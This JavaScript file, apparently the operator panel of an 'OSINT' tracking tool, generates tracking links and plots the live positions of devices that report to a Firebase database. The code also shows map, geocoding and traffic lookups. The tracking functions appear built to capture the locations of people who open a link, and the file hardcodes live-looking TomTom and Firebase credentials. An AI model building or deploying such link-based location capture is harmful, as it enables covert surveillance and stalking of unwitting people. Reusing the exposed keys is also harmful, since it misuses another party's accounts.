// CONFIG
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

// GLOBAL STATES
let map, trafficLayer, myLocationMarker;
let deviceMarkers = {}, incidentMarkers = [], seismicMarkers = [];

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    addLog("SİSTEM ÇEKİRDEĞİ v6.7 YÜKLENDİ.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { opacity: 0.8 }).addTo(map);

    map.on('click', onMapClick);
}

// HARİTA ANALİZ MODÜLÜ (Adres + Trafik Durumu)
async function onMapClick(e) {
    const { lat, lng } = e.latlng;
    const popup = L.popup().setLatLng(e.latlng).setContent('<div class="text-[10px] animate-pulse">ANALİZ EDİLİYOR...</div>').openOn(map);

    try {
        const addrRes = await fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`);
        const flowRes = await fetch(`https://api.tomtom.com/traffic/services/4/flowSegmentData/relative0/10/json?key=${TOMTOM_KEY}&point=${lat},${lng}`);
        
        const addrData = await addrRes.json();
        const flowData = await flowRes.json();

        let status = "AÇIK", color = "text-green-500", desc = "Akıcı trafik.";
        if (flowData.flowSegmentData) {
            const ratio = flowData.flowSegmentData.currentSpeed / flowData.flowSegmentData.freeFlowSpeed;
            if (ratio < 0.4) { status = "KAPALI / YOĞUN"; color = "text-red-500"; desc = "Yüksek yoğunluk veya engel."; }
            else if (ratio < 0.8) { status = "YOĞUN"; color = "text-yellow-500"; desc = "Yavaş ilerleyen trafik."; }
        }

        popup.setContent(`
            <div class="text-[10px] space-y-1">
                <b class="text-red-600 underline">İSTİHBARAT RAPORU</b><br>
                <b>ADRES:</b> ${addrData.addresses[0].address.freeformAddress}<br>
                <b>DURUM:</b> <span class="${color}">${status}</span><br>
                <i class="text-gray-400">${desc}</i>
            </div>
        `);
        addLog(`Analiz: ${addrData.addresses[0].address.freeformAddress}`);
    } catch (e) { popup.setContent("HATA: Veri alınamadı."); }
}

// CİHAZ TAKİP DİNLEYİCİSİ
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    if (!data) return;
    for (let id in data) {
        const { lat, lng } = data[id];
        if (deviceMarkers[id]) deviceMarkers[id].setLatLng([lat, lng]);
        else {
            deviceMarkers[id] = L.marker([lat, lng], {
                icon: L.divIcon({ className: 'd-icon', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` })
            }).addTo(map);
            addLog(`CİHAZ AKTİF: ${id}`);
            updateUI(id);
        }
    }
});

// DİĞER FONKSİYONLAR
function generateTrackingLink() {
    const id = "NODE_" + Math.floor(Math.random() * 9999);
    document.getElementById('generatedLink').value = `https://berkaytdev.com/osint/track.html?id=${id}`;
    document.getElementById('linkModal').classList.remove('hidden');
}

async function searchLocation() {
    const q = document.getElementById('searchInput').value;
    const res = await fetch(`https://api.tomtom.com/search/2/geocode/${encodeURIComponent(q)}.json?key=${TOMTOM_KEY}&limit=1`);
    const data = await res.json();
    if (data.results[0]) map.flyTo([data.results[0].position.lat, data.results[0].position.lon], 15);
}

function getMyLocation() {
    navigator.geolocation.getCurrentPosition(p => {
        const coords = [p.coords.latitude, p.coords.longitude];
        if (myLocationMarker) map.removeLayer(myLocationMarker);
        myLocationMarker = L.circleMarker(coords, { radius: 8, color: '#00ffff' }).addTo(map);
        map.flyTo(coords, 16);
    });
}

function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-800">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }

function toggleLayer(t) {
    const b = document.getElementById('btn-' + t);
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    b.classList.toggle('active');
}

function updateUI(id) {
    const l = document.getElementById('deviceList');
    if (l.innerHTML.includes("aranıyor")) l.innerHTML = '';
    if (!document.getElementById('i-' + id)) {
        l.innerHTML += `<div id="i-${id}" class="bg-green-900/10 p-2 border-l-2 border-green-500 mb-1 flex justify-between"><span>${id}</span><span class="text-green-500 animate-pulse">LIVE</span></div>`;
    }
}
